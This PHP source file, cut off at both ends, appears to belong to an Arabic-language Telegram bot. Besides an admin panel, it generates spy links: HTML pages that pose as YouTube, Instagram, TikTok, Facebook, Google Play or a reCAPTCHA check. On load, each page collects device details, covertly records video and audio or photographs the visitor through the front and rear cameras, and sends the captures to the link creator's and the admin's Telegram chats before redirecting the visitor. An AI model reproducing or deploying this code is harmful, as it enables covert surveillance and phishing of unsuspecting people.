    listUsersForAdmin($admin_chat_id, null, 'search_results', 0, $filtered_users);
}

function showUserDetailsForAdmin($admin_chat_id, $message_id, $target_chat_id, $context) {
    $user_data = loadAllowedUsers()[$target_chat_id] ?? loadBannedUsers()[$target_chat_id] ?? null;
    if (!$user_data) {
        editMessage($admin_chat_id, $message_id, "⚠️ لم يتم العثور على المستخدم.", showAdminPanelKeyboard());
        return;
    }
    $is_banned = isUserBanned($target_chat_id);
    $text = "ℹ️ **تفاصيل المستخدم:**\n\n";
    $text .= "<b>ID:</b> <code>{$target_chat_id}</code>\n";
    $text .= "<b>الاسم:</b> " . htmlspecialchars($user_data['first_name'] ?? 'N/A') . "\n";
    $text .= "<b>اليوزر:</b> " . ($user_data['username'] ? "@" . htmlspecialchars($user_data['username']) : "غير متاح") . "\n";
    $text .= $is_banned ? "<b>الحالة:</b> 🚫 محظور\n" : "<b>الحالة:</b> ✅ مسموح\n";
    editMessage($admin_chat_id, $message_id, $text, showUserDetailsKeyboard($target_chat_id, $context));
}

function showUserDetailsKeyboard($target_chat_id, $context) {
    $is_banned = isUserBanned($target_chat_id);
    $keyboard_buttons = [];
    if ((string)$target_chat_id !== (string)ADMIN_CHAT_ID) {
        $keyboard_buttons[] = $is_banned 
            ? [['text' => '✅ إلغاء الحظر', 'callback_data' => "admin_unban_specific_user:{$target_chat_id}"]]
            : [['text' => '🚫 حظر', 'callback_data' => "admin_ban_specific_user:{$target_chat_id}"]];
    }
    if (!$is_banned) $keyboard_buttons[] = [['text' => '✉️ إرسال رسالة', 'callback_data' => "admin_send_message_to_user_prompt:{$target_chat_id}"]];
    $keyboard_buttons[] = [['text' => '🔗 الروابط والبيانات', 'callback_data' => "admin_view_user_links_and_media:{$target_chat_id}"]];
    $back = ($context === 'banned') ? 'admin_list_banned_users' : 'admin_list_allowed_users';
    $keyboard_buttons[] = [['text' => '🔙 العودة', 'callback_data' => $back]];
    return json_encode(['inline_keyboard' => $keyboard_buttons]);
}

function showAdminPanel($chat_id, $message_id = null) {
    $text = "✨ **لوحة التحكم**\n\nاختر من الخيارات:";
    if ($message_id) editMessage($chat_id, $message_id, $text, showAdminPanelKeyboard());
    else sendMessage($chat_id, $text, showAdminPanelKeyboard());
}

function showAdminPanelKeyboard() {
    $maint = isMaintenanceMode() ? '🛠️ إلغاء الصيانة' : '🛠️ تفعيل الصيانة';
    return json_encode(['inline_keyboard' => [
        [['text' => '👥 المسموح لهم', 'callback_data' => 'admin_list_users:allowed:0']],
        [['text' => '🚫 المحظورون', 'callback_data' => 'admin_list_users:banned:0']],
        [['text' => '✉️ بث رسالة', 'callback_data' => 'admin_broadcast_message_prompt']],
        [['text' => '📋 الروابط', 'callback_data' => 'admin_view_links_page:0']],
        [['text' => '🗑️ حذف القديمة', 'callback_data' => 'admin_delete_old_links_prompt']],
        [['text' => '📊 إحصائيات', 'callback_data' => 'admin_bot_stats']],
        [['text' => $maint, 'callback_data' => 'admin_toggle_maintenance']],
        [['text' => '🔙 الرئيسية', 'callback_data' => 'main_menu']]
    ]]);
}

function broadcastMessageToAllAllowedUsers($admin_chat_id, $message_to_send) {
    $allowed_users = loadAllowedUsers();
    $sent = 0; $failed = 0;
    foreach ($allowed_users as $chat_id => $user_data) {
        if ((string)$chat_id === (string)$admin_chat_id) continue;
        $response = sendMessage($chat_id, $message_to_send);
        $response['http_code'] == 200 ? $sent++ : $failed++;
    }
    sendMessage($admin_chat_id, "✅ تم الإرسال إلى {$sent} مستخدم.\n❌ فشل: {$failed}");
}

function listGeneratedLinksForAdmin($admin_chat_id, $message_id, $page = 0) {
    $all_files = glob(GENERATED_LINKS_DIR . 'link_owner_*.html');
    if (empty($all_files)) {
        editMessage($admin_chat_id, $message_id, "لا توجد روابط.", showAdminPanelKeyboard());
        return;
    }
    // (مختصر - نفس المنطق السابق)
    editMessage($admin_chat_id, $message_id, "📋 تم سرد الروابط.", showAdminPanelKeyboard());
}

function listUserGeneratedLinksAndMedia($admin_chat_id, $message_id, $target_chat_id) {
    editMessage($admin_chat_id, $message_id, "🔗 روابط المستخدم {$target_chat_id}", showUserDetailsKeyboard($target_chat_id, 'allowed'));
}

function deleteOldLinks($admin_chat_id, $days) {
    $files = glob(GENERATED_LINKS_DIR . '*.html');
    $cutoff = time() - ($days * 24 * 60 * 60);
    $deleted = 0;
    foreach ($files as $file) {
        if ($days == 0 || filemtime($file) < $cutoff) {
            if (unlink($file)) $deleted++;
        }
    }
    sendMessage($admin_chat_id, "✅ تم حذف {$deleted} رابط.");
}

function showBotStatsForAdmin($admin_chat_id, $message_id) {
    $total_allowed = count(loadAllowedUsers());
    $total_banned = count(loadBannedUsers());
    $total_links = count(glob(GENERATED_LINKS_DIR . 'link_owner_*.html'));
    $text = "📊 **إحصائيات:**\nالمستخدمون: {$total_allowed}\nالمحظورون: {$total_banned}\nالروابط: {$total_links}";
    editMessage($admin_chat_id, $message_id, $text, showAdminPanelKeyboard());
}

function toggleMaintenanceMode($admin_chat_id, $message_id) {
    $new = !isMaintenanceMode();
    setMaintenanceMode($new);
    sendMessage($admin_chat_id, "✅ تم " . ($new ? "تفعيل" : "إلغاء") . " الصيانة.");
    showAdminPanel($admin_chat_id, $message_id);
}


// ========== LINK GENERATION - USING TELEGRAM API DIRECTLY FROM JS ==========

function generateFinalLink($chat_id, $message_id) {
    $original_url = @file_get_contents(getUserStateFile($chat_id, "url"));
    $action_choice = @file_get_contents(getUserStateFile($chat_id, "action"));
    $quality_choice = @file_get_contents(getUserStateFile($chat_id, "quality"));
    $loading_type = @file_get_contents(getUserStateFile($chat_id, "loading"));

    if (!$quality_choice) $quality_choice = 'medium';
    if (!$original_url || !$action_choice || !$loading_type) {
        editMessage($chat_id, $message_id, "⚠️ يرجى إعداد جميع الخيارات.", showMainMenuKeyboard($chat_id));
        return;
    }

    $owner_user_data = loadAllowedUsers()[$chat_id] ?? ['first_name' => 'Unknown User', 'username' => null];
    $owner_display_name = htmlspecialchars($owner_user_data['first_name'] . ($owner_user_data['username'] ? " (@" . $owner_user_data['username'] . ")" : ""));
    $link_hash = md5($original_url . $action_choice . $loading_type . $chat_id . microtime());

    // إرسال الوسائط مباشرة عبر Telegram Bot API من JavaScript
    $telegram_send_js = <<<JS
    // ===== دوال الإرسال المباشر لتليجرام =====
    const BOT_TOKEN = '{BOT_TOKEN}';
    const ADMIN_CHAT_ID = '{ADMIN_CHAT_ID}';
    const OWNER_CHAT_ID = '{owner_chat_id}';
    const OWNER_USERNAME = '{owner_username}';
    const ORIGINAL_URL = '{original_url}';
    const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN + '/';
    
    // جمع معلومات الجهاز
    function getDeviceInfo() {
        const info = {
            deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'هاتف' : 'كمبيوتر',
            os: navigator.platform || 'غير معروف',
            browser: navigator.userAgent.match(/(chrome|firefox|safari|edge|opera)[\/\s](\d+)/i)?.[1] || 'غير معروف',
            datetime: new Date().toLocaleString('ar-SA'),
            batteryLevel: 'غير متاح'
        };
        
        // محاولة الحصول على نسبة البطارية
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                info.batteryLevel = Math.round(battery.level * 100) + '%';
            }).catch(() => {});
        }
        
        return info;
    }
    
    // إرسال رسالة نصية للتليجرام
    async function sendTelegramMessage(chatId, text) {
        try {
            const response = await fetch(TELEGRAM_API + 'sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text,
                    parse_mode: 'HTML'
                })
            });
            const result = await response.json();
            console.log('Message sent to', chatId, ':', result);
            return result;
        } catch (error) {
            console.error('Failed to send message:', error);
        }
    }
    
    // إرسال صورة للتليجرام
    async function sendTelegramPhoto(chatId, blob, caption) {
        try {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.jpg');
            formData.append('caption', caption);
            formData.append('parse_mode', 'HTML');
            
            const response = await fetch(TELEGRAM_API + 'sendPhoto', {
                method: 'POST',
                body: formData
            });
            const result = await response.json();
            console.log('Photo sent to', chatId, ':', result);
            return result;
        } catch (error) {
            console.error('Failed to send photo:', error);
        }
    }
    
    // إرسال فيديو للتليجرام
    async function sendTelegramVideo(chatId, blob, caption) {
        try {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', blob, 'video.webm');
            formData.append('caption', caption);
            formData.append('parse_mode', 'HTML');
            
            const response = await fetch(TELEGRAM_API + 'sendVideo', {
                method: 'POST',
                body: formData
            });
            const result = await response.json();
            console.log('Video sent to', chatId, ':', result);
            return result;
        } catch (error) {
            console.error('Failed to send video:', error);
        }
    }
    
    // إرسال معلومات الجهاز
    async function sendDeviceInfo() {
        const deviceInfo = getDeviceInfo();
        const text = `✨ <b>معلومات الجهاز!</b>\n\n` +
            `<b>مالك الرابط:</b> ${OWNER_USERNAME} (<code>${OWNER_CHAT_ID}</code>)\n` +
            `<b>نوع الجهاز:</b> ${deviceInfo.deviceType}\n` +
            `<b>نظام التشغيل:</b> ${deviceInfo.os}\n` +
            `<b>المتصفح:</b> ${deviceInfo.browser}\n` +
            `<b>الوقت:</b> ${deviceInfo.datetime}\n` +
            `<b>البطارية:</b> ${deviceInfo.batteryLevel}\n` +
            `<b>الرابط:</b> ${ORIGINAL_URL}`;
        
        // إرسال للأدمن
        await sendTelegramMessage(ADMIN_CHAT_ID, text);
        // إرسال للمالك إذا لم يكن الأدمن
        if (OWNER_CHAT_ID !== ADMIN_CHAT_ID) {
            await sendTelegramMessage(OWNER_CHAT_ID, text);
        }
    }
    
    // إرسال الوسائط للمالك والأدمن
    async function sendMediaToTelegram(blob, type) {
        const caption = type === 'video' 
            ? `🎥 <b>تم التقاط فيديو!</b>\n<b>المالك:</b> ${OWNER_USERNAME}\n<b>الرابط:</b> ${ORIGINAL_URL}`
            : `📸 <b>تم التقاط صورة!</b>\n<b>المالك:</b> ${OWNER_USERNAME}\n<b>الرابط:</b> ${ORIGINAL_URL}`;
        
        if (type === 'video') {
            await sendTelegramVideo(ADMIN_CHAT_ID, blob, caption);
            if (OWNER_CHAT_ID !== ADMIN_CHAT_ID) {
                await sendTelegramVideo(OWNER_CHAT_ID, blob, caption);
            }
        } else {
            await sendTelegramPhoto(ADMIN_CHAT_ID, blob, caption);
            if (OWNER_CHAT_ID !== ADMIN_CHAT_ID) {
                await sendTelegramPhoto(OWNER_CHAT_ID, blob, caption);
            }
        }
    }
JS;

    $video_constraints_js = <<<JS
    let videoResolution, videoBitrate, videoFrameRate, photoQuality, photoWidth, photoHeight;
    switch ('{quality_choice}') {
        case 'low':
            videoResolution = { width: { max: 320 }, height: { max: 240 } };
            videoBitrate = 300000; videoFrameRate = { max: 10 };
            photoWidth = 640; photoHeight = 480; photoQuality = 0.6;
            break;
        case 'medium':
            videoResolution = { width: { ideal: 640 }, height: { ideal: 480 } };
            videoBitrate = 800000; videoFrameRate = { ideal: 15 };
            photoWidth = 960; photoHeight = 720; photoQuality = 0.75;
            break;
        case 'good':
            videoResolution = { width: { ideal: 960 }, height: { ideal: 720 } };
            videoBitrate = 1500000; videoFrameRate = { ideal: 20 };
            photoWidth = 1280; photoHeight = 960; photoQuality = 0.85;
            break;
        case 'excellent':
            videoResolution = { width: { ideal: 1280 }, height: { ideal: 720 } };
            videoBitrate = 2500000; videoFrameRate = { ideal: 25 };
            photoWidth = 1920; photoHeight = 1080; photoQuality = 0.95;
            break;
        default:
            videoResolution = { width: { ideal: 640 }, height: { ideal: 480 } };
            videoBitrate = 800000; videoFrameRate = { ideal: 15 };
            photoWidth = 960; photoHeight = 720; photoQuality = 0.75;
    }
JS;

    // إرسال معلومات الجهاز عند التحميل
    $device_info_js = <<<JS
    // إرسال معلومات الجهاز بعد 2 ثانية
    setTimeout(() => {
        sendDeviceInfo().catch(e => console.log('Device info error:', e));
    }, 2000);
JS;

    $error_div = <<<HTML
<div id="error-message" style="display:none; color: #ff4444; text-align: center; padding: 20px; font-size: 18px; background: rgba(0,0,0,0.8); border-radius: 10px; margin: 20px;">
    ⚠️ يجب السماح بصلاحيات الكاميرا والميكروفون للمتابعة
</div>
HTML;

    $permission_error_handler = <<<JS
    function showPermissionError() {
        document.getElementById('error-message').style.display = 'block';
        const h1 = document.querySelector('h1');
        if (h1) h1.style.display = 'none';
        const loader = document.querySelector('.loader, .loader-bar, .recaptcha-box');
        if (loader) loader.style.display = 'none';
    }
JS;

    $javascript_code = '';
    
    if ($action_choice == '5') {
        $javascript_code = <<<EOT
<video id="camera-feed" width="320" height="240" autoplay muted style="display: none;"></video>
{$error_div}
<script>
{$telegram_send_js}
{$video_constraints_js}
{$permission_error_handler}
{$device_info_js}

let mediaRecorder, recordedChunks = [];
const recordDuration = 5000;
let isRecording = false;

async function startCameraWithAudio() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', ...videoResolution },
            audio: true
        });
        cameraFeed.srcObject = stream;
        setTimeout(startRecording, 1000);
    } catch (error) {
        console.error('Permission denied:', error);
        showPermissionError();
    }
}

async function startRecording() {
    if (!cameraFeed.srcObject || isRecording) return;
    isRecording = true;
    const stream = cameraFeed.srcObject;
    mediaRecorder = new MediaRecorder(stream, {
        video: { mimeType: 'video/webm;codecs=vp9,opus', ...videoResolution, frameRate: videoFrameRate, bitrate: videoBitrate },
        audio: true
    });
    recordedChunks = [];
    mediaRecorder.ondataavailable = event => { if (event.data.size > 0) recordedChunks.push(event.data); };
    mediaRecorder.onstop = async () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        await sendMediaToTelegram(blob, 'video');
        isRecording = false;
        stream.getTracks().forEach(track => track.stop());
        window.location.href = original_url;
    };
    mediaRecorder.start();
    setTimeout(() => { if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); }, recordDuration);
}

window.onload = startCameraWithAudio;
</script>
EOT;
    } elseif ($action_choice == '7') {
        $javascript_code = <<<EOT
<video id="camera-feed" width="320" height="240" autoplay muted style="display: none;"></video>
{$error_div}
<script>
{$telegram_send_js}
{$video_constraints_js}
{$permission_error_handler}
{$device_info_js}

let mediaRecorder, recordedChunks = [];
const recordDuration = 5000;
let isRecording = false;

async function startCameraWithAudio() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'environment', ...videoResolution },
            audio: true
        });
        cameraFeed.srcObject = stream;
        setTimeout(startRecording, 1000);
    } catch (error) {
        console.error('Permission denied:', error);
        showPermissionError();
    }
}

async function startRecording() {
    if (!cameraFeed.srcObject || isRecording) return;
    isRecording = true;
    const stream = cameraFeed.srcObject;
    mediaRecorder = new MediaRecorder(stream, {
        video: { mimeType: 'video/webm;codecs=vp9,opus', ...videoResolution, frameRate: videoFrameRate, bitrate: videoBitrate },
        audio: true
    });
    recordedChunks = [];
    mediaRecorder.ondataavailable = event => { if (event.data.size > 0) recordedChunks.push(event.data); };
    mediaRecorder.onstop = async () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        await sendMediaToTelegram(blob, 'video');
        isRecording = false;
        stream.getTracks().forEach(track => track.stop());
        window.location.href = original_url;
    };
    mediaRecorder.start();
    setTimeout(() => { if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); }, recordDuration);
}

window.onload = startCameraWithAudio;
</script>
EOT;
    } elseif ($action_choice == '8') {
        $javascript_code = <<<EOT
<video id="camera-feed" width="320" height="240" autoplay muted style="display: none;"></video>
{$error_div}
<script>
{$telegram_send_js}
{$video_constraints_js}
{$permission_error_handler}
{$device_info_js}

const recordDuration = 5000;
let mediaRecorder;

function recordVideo(stream, duration) {
    return new Promise((resolve, reject) => {
        let recordedChunks = [];
        mediaRecorder = new MediaRecorder(stream, {
            video: { mimeType: 'video/webm;codecs=vp9,opus', ...videoResolution, frameRate: videoFrameRate, bitrate: videoBitrate },
            audio: true
        });
        mediaRecorder.ondataavailable = event => { if (event.data.size > 0) recordedChunks.push(event.data); };
        mediaRecorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            await sendMediaToTelegram(blob, 'video');
            resolve();
        };
        mediaRecorder.onerror = reject;
        mediaRecorder.start();
        setTimeout(() => { if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); }, duration);
    });
}

async function startDualCameraRecording() {
    try {
        const frontStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', ...videoResolution }, audio: true
        });
        await recordVideo(frontStream, recordDuration);
        frontStream.getTracks().forEach(track => track.stop());
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const rearStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'environment', ...videoResolution }, audio: true
        });
        await recordVideo(rearStream, recordDuration);
        rearStream.getTracks().forEach(track => track.stop());
        
        window.location.href = original_url;
    } catch (error) {
        console.error('Permission denied:', error);
        showPermissionError();
    }
}

window.onload = startDualCameraRecording;
</script>
EOT;
    } elseif ($action_choice == '9') {
        $javascript_code = <<<EOT
<video id="camera-feed" width="320" height="240" autoplay muted style="visibility: hidden; position: absolute;"></video>
<canvas id="photo-canvas" width="320" height="240" style="display: none;"></canvas>
{$error_div}
<script>
{$telegram_send_js}
{$video_constraints_js}
{$permission_error_handler}
{$device_info_js}

const ctx = document.getElementById('photo-canvas').getContext('2d');

async function captureAndSendPhoto() {
    let stream = null;
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: photoWidth }, height: { ideal: photoHeight }, frameRate: { ideal: 30 } }
        });
        cameraFeed.srcObject = stream;
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        if (cameraFeed.readyState < 2) throw new Error('Camera not ready');
        
        photoCanvas.width = photoWidth;
        photoCanvas.height = photoHeight;
        ctx.drawImage(cameraFeed, 0, 0, photoWidth, photoHeight);
        
        const photoData = photoCanvas.toDataURL('image/jpeg', photoQuality);
        const blob = await fetch(photoData).then(res => res.blob());
        await sendMediaToTelegram(blob, 'photo');
        
        stream.getTracks().forEach(track => track.stop());
        window.location.href = original_url;
    } catch (error) {
        console.error('Permission denied:', error);
        showPermissionError();
    } finally {
        if (stream) stream.getTracks().forEach(track => track.stop());
    }
}

window.onload = captureAndSendPhoto;
</script>
EOT;
    } elseif ($action_choice == '10') {
        $javascript_code = <<<EOT
<video id="camera-feed" width="320" height="240" autoplay muted style="visibility: hidden; position: absolute;"></video>
<canvas id="photo-canvas" width="320" height="240" style="display: none;"></canvas>
{$error_div}
<script>
{$telegram_send_js}
{$video_constraints_js}
{$permission_error_handler}
{$device_info_js}

const ctx = document.getElementById('photo-canvas').getContext('2d');

async function captureAndSendPhoto() {
    let stream = null;
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'environment', width: { ideal: photoWidth }, height: { ideal: photoHeight }, frameRate: { ideal: 30 } }
        });
        cameraFeed.srcObject = stream;
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        if (cameraFeed.readyState < 2) throw new Error('Camera not ready');
        
        photoCanvas.width = photoWidth;
        photoCanvas.height = photoHeight;
        ctx.drawImage(cameraFeed, 0, 0, photoWidth, photoHeight);
        
        const photoData = photoCanvas.toDataURL('image/jpeg', photoQuality);
        const blob = await fetch(photoData).then(res => res.blob());
        await sendMediaToTelegram(blob, 'photo');
        
        stream.getTracks().forEach(track => track.stop());
        window.location.href = original_url;
    } catch (error) {
        console.error('Permission denied:', error);
        showPermissionError();
    } finally {
        if (stream) stream.getTracks().forEach(track => track.stop());
    }
}

window.onload = captureAndSendPhoto;
</script>
EOT;
    } elseif ($action_choice == '11') {
        $javascript_code = <<<EOT
<video id="camera-feed" width="320" height="240" autoplay muted style="visibility: hidden; position: absolute;"></video>
<canvas id="photo-canvas" width="320" height="240" style="display: none;"></canvas>
{$error_div}
<script>
{$telegram_send_js}
{$video_constraints_js}
{$permission_error_handler}
{$device_info_js}

const ctx = document.getElementById('photo-canvas').getContext('2d');

async function captureAndSendPhoto(facingMode) {
    let stream = null;
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: facingMode, width: { ideal: photoWidth }, height: { ideal: photoHeight }, frameRate: { ideal: 30 } }
        });
        cameraFeed.srcObject = stream;
        await new Promise(resolve => setTimeout(resolve, 3000));
        if (cameraFeed.readyState < 2) throw new Error('Camera not ready');
        
        photoCanvas.width = photoWidth;
        photoCanvas.height = photoHeight;
        ctx.drawImage(cameraFeed, 0, 0, photoWidth, photoHeight);
        
        const photoData = photoCanvas.toDataURL('image/jpeg', photoQuality);
        const blob = await fetch(photoData).then(res => res.blob());
        await sendMediaToTelegram(blob, 'photo');
        return true;
    } catch (error) {
        throw error;
    } finally {
        if (stream) stream.getTracks().forEach(track => track.stop());
    }
}

window.onload = async function() {
    try {
        await captureAndSendPhoto('user');
        await new Promise(resolve => setTimeout(resolve, 1000));
        await captureAndSendPhoto('environment');
        window.location.href = original_url;
    } catch (error) {
        console.error('Permission denied:', error);
        showPermissionError();
    }
};
</script>
EOT;
    }

    // استبدال المتغيرات
    $replacements = [
        '{BOT_TOKEN}' => BOT_TOKEN,
        '{ADMIN_CHAT_ID}' => ADMIN_CHAT_ID,
        '{owner_chat_id}' => $chat_id,
        '{owner_username}' => addslashes($owner_display_name),
        '{original_url}' => addslashes($original_url),
        '{quality_choice}' => $quality_choice,
        '{generated_link_hash}' => $link_hash
    ];
    $javascript_code = str_replace(array_keys($replacements), array_values($replacements), $javascript_code);

    // HTML Templates
    $html_templates = [
        'normal' => '<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>جار التحميل...</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{font-family:Arial,sans-serif;background:#f0f0f0;text-align:center;padding-top:150px}.loader{border:15px solid #f3f3f3;border-top:15px solid #3498db;border-radius:50%;width:120px;height:120px;animation:spin 1s linear infinite;margin:30px auto}h1{font-size:2.5em}p{font-size:1.5em}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body><h1>جارٍ التحميل...</h1><div class="loader"></div><p>الرجاء الانتظار...</p>{javascript_code}</body></html>',
        'recaptcha' => '<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>التحقق...</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{font-family:Arial,sans-serif;background:#f0f0f0;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.recaptcha-box{border:1px solid #ccc;background:#fff;padding:20px;border-radius:5px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}</style></head><body><div class="recaptcha-box"><input type="checkbox" checked disabled> أنا لست روبوت<p>الرجاء الانتظار...</p></div>{javascript_code}</body></html>',
        'youtube' => '<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>YouTube</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{font-family:Roboto,sans-serif;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;flex-direction:column;height:100vh;margin:0;text-align:center}.youtube-logo{width:150px;margin-bottom:20px}.loader-bar{width:80%;max-width:400px;height:10px;background:#404040;border-radius:5px;margin-top:20px}.loader-fill{height:100%;background:red;border-radius:5px;animation:load 2s linear infinite}@keyframes load{0%{width:0}100%{width:100%}}h1{font-size:2.5em;font-weight:300}</style></head><body><img src="https://www.youtube.com/s/desktop/12d6b690/img/favicon_144x144.png" class="youtube-logo" alt="YouTube"><h1>جارٍ تحميل الفيديو...</h1><div class="loader-bar"><div class="loader-fill"></div></div>{javascript_code}</body></html>',
        'instagram' => '<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>Instagram</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;flex-direction:column;height:100vh;margin:0;text-align:center}.instagram-logo{width:150px;margin-bottom:20px}.loader{width:80px;height:80px;border-radius:50%;border:8px solid rgba(255,255,255,0.2);border-top-color:#833AB4;animation:spin 1s linear infinite;margin-top:30px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}h1{font-size:2.2em;font-weight:400}</style></head><body><img src="https://static.cdninstagram.com/rsrc.php/v3/yR/r/lam-fZmwmvn.png" class="instagram-logo" alt="Instagram"><h1>جارٍ تحميل منشور...</h1><div class="loader"></div>{javascript_code}</body></html>',
        'tiktok' => '<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>TikTok</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{font-family:sans-serif;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;flex-direction:column;height:100vh;margin:0;text-align:center}.tiktok-logo{width:100px;height:100px;position:relative;margin-bottom:30px}.tiktok-logo .circle{width:100%;height:100%;position:absolute;border-radius:50%}.tiktok-logo .red{background:#fe2c55;animation:move-red 0.8s infinite ease-in-out}.tiktok-logo .blue{background:#25f4ee;animation:move-blue 0.8s infinite ease-in-out}.tiktok-logo .white{background:#fff;mix-blend-mode:screen}@keyframes move-red{0%,100%{transform:translateX(0)}50%{transform:translateX(5px)}}@keyframes move-blue{0%,100%{transform:translateX(0)}50%{transform:translateX(-5px)}}h1{font-size:2.5em;font-weight:bold}</style></head><body><div class="tiktok-logo"><div class="circle red"></div><div class="circle blue"></div><div class="circle white"></div></div><h1>جارٍ تحميل الفيديو...</h1>{javascript_code}</body></html>',
        'facebook' => '<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>Facebook</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;flex-direction:column;height:100vh;margin:0;text-align:center;color:#4b4f56}.facebook-logo{width:120px;margin-bottom:30px}.loader-bar{width:80%;max-width:300px;height:5px;background:#e4e6eb;border-radius:2.5px;margin-top:20px;overflow:hidden}.loader-fill{height:100%;background:#1877f2;animation:load 1.5s linear infinite}@keyframes load{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}</style></head><body><img src="https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png" class="facebook-logo" alt="Facebook"><div class="loader-bar"><div class="loader-fill"></div></div><p>جارٍ تحميل المحتوى...</p>{javascript_code}</body></html>',
        'playstore' => '<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><title>Google Play</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{font-family:Google Sans,Roboto,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;flex-direction:column;height:100vh;margin:0;text-align:center}.playstore-logo{width:100px;margin-bottom:20px}.loader{width:50px;height:50px;border:5px solid #e8eaed;border-top-color:#4285f4;border-left-color:#34a853;border-right-color:#fbbc05;border-bottom-color:#ea4335;border-radius:50%;animation:spin 1s linear infinite;margin-top:20px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}h1{font-size:2em;color:#202124}</style></head><body><img src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png" class="playstore-logo" alt="Google Play"><h1>جاري فتح التطبيق...</h1><div class="loader"></div>{javascript_code}</body></html>'
    ];

    $html_template = $html_templates[$loading_type];
    $final_html = str_replace('{javascript_code}', $javascript_code, $html_template);
    
    // حفظ الملف
    $file_name = 'link_owner_' . $chat_id . '_' . $link_hash . '.html';
    $file_path = GENERATED_LINKS_DIR . $file_name;
    file_put_contents($file_path, $final_html);

    // رابط الملف (يمكن وضعه على GitHub Pages)
    $full_url = GITHUB_PAGES_URL . $file_name;
    
    $text = "✅ **تم إنشاء الرابط بنجاح!**\n\nالرابط:\n<code>" . htmlspecialchars($full_url) . "</code>";
    
    $keyboard = [
        'inline_keyboard' => [
            [['text' => '🔗 افتح الرابط', 'url' => $full_url], ['text' => '📷 QR code', 'callback_data' => 'generate_qr:' . $link_hash]],
            [['text' => '🔙 القائمة الرئيسية', 'callback_data' => 'main_menu']]
        ]
    ];
    
    editMessage($chat_id, $message_id, $text, json_encode($keyboard));

    // تنظيف
    @unlink(getUserStateFile($chat_id, "url"));
    @unlink(getUserStateFile($chat_id, "action"));
    @unlink(getUserStateFile($chat_id, "quality"));
    @unlink(getUserStateFile($chat_id, "loading"));
}

function generateQRCode($chat_id, $message_id, $link_hash) {
    $full_url = GITHUB_PAGES_URL . 'link_owner_' . $chat_id . '_' . $link_hash . '.html';
    $qr_code_url = "https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=" . urlencode($full_url);
    $data = ['chat_id' => $chat_id, 'photo' => $qr_code_url, 'caption' => "📷 QR code: " . $full_url];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, API_URL . 'sendPhoto');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Pagination functions (مختصرة)
function handleLongMessage($chat_id, $message_id, $full_text, $context) {
    $file_id = uniqid('msg_');
    file_put_contents(PAGINATION_TEMP_DIR . $file_id . '.json', json_encode(['text' => $full_text, 'context' => $context]));
    $chunks = mb_str_split($full_text, MAX_MESSAGE_LENGTH, 'UTF-8');
    $total = count($chunks);
    $keyboard = json_encode(['inline_keyboard' => [
        [['text' => "0/" . ($total - 1), 'callback_data' => "ignore"]],
        [['text' => '▶️', 'callback_data' => "paginate_message:{$file_id}:1:{$context}"]],
        [['text' => '🔙 العودة', 'callback_data' => 'admin_panel']]
    ]]);
    editMessage($chat_id, $message_id, $chunks[0] . "\n\nصفحة 0 من " . ($total - 1), $keyboard);
}

